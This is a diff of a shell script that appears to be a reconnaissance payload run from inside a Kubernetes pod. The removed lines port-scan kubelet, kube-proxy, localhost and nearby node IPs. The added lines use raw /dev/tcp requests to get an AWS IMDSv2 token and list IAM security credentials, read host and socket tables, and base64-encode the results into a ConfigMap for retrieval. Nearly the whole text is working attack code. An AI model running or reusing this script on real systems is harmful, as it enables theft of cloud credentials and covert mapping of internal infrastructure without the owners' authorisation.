@@ -1,47 +1,49 @@
 #!/bin/sh
-NODE_IP="10.6.40.171"
-
 RECON=$( (
-  echo "===KUBELET_10255==="
-  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10255 2>/dev/null && printf 'GET /pods HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
+  echo "===IMDSv2_TOKEN==="
+  timeout 3 bash -c "
+    exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
+    printf 'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n' >&3
+    cat <&3
+    exec 3>&-
+  " 2>/dev/null || echo "FAILED"
 
   echo ""
-  echo "===KUBELET_10255_HEALTHZ==="
-  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10255 2>/dev/null && printf 'GET /healthz HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
+  echo "===IMDS_ROLE==="
+  # First get token, then use it
+  TOKEN=$(timeout 3 bash -c "
+    exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
+    printf 'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n' >&3
+    cat <&3
+    exec 3>&-
+  " 2>/dev/null)
+  echo "Token: ${TOKEN:0:50}..."
+  
+  if [ -n "$TOKEN" ]; then
+    timeout 3 bash -c "
+      exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null || exit 1
+      printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: $TOKEN\r\n\r\n' >&3
+      cat <&3
+      exec 3>&-
+    " 2>/dev/null
+  fi
 
   echo ""
-  echo "===KUBE_PROXY==="
-  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10249 2>/dev/null && printf 'GET /healthz HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
-  timeout 3 bash -c "exec 3<>/dev/tcp/$NODE_IP/10256 2>/dev/null && printf 'GET /healthz HTTP/1.0\r\nHost: $NODE_IP\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
+  echo "===HOST_IP==="
+  hostname -i 2>/dev/null
+  cat /etc/hosts 2>/dev/null
 
   echo ""
-  echo "===IMDS==="
-  timeout 3 bash -c "exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null && printf 'GET /latest/meta-data/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
-
-  echo ""
-  echo "===IMDS_IAM==="
-  timeout 3 bash -c "exec 3<>/dev/tcp/169.254.169.254/80 2>/dev/null && printf 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n' >&3 && cat <&3 && exec 3>&-" 2>/dev/null || echo "CLOSED"
-
-  echo ""
-  echo "===POD_IP_SCAN==="
-  # Scan our pod's IP for open ports
-  for port in 22 80 443 8080 8443 10250 10255; do
-    timeout 1 bash -c "exec 3<>/dev/tcp/127.0.0.1/$port 2>/dev/null && echo '$port OPEN' && exec 3>&-" 2>/dev/null || true
-  done
-
-  echo ""
-  echo "===OTHER_NODES==="
-  # Try other potential node IPs based on the 10.6.40.x range
-  for ip in 10.6.40.172 10.6.40.1 10.6.47.1; do
-    printf "$ip: "
-    timeout 1 bash -c "exec 3<>/dev/tcp/$ip/22 2>/dev/null && echo 'SSH OPEN' && exec 3>&-" 2>/dev/null || echo "no_ssh"
-  done
+  echo "===NETSTAT==="
+  # Check listening ports on our pod
+  cat /proc/net/tcp 2>/dev/null | head -10
+  cat /proc/net/tcp6 2>/dev/null | head -5
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: nodescan
+  name: imds
 data:
   result: $RECON
 EOF
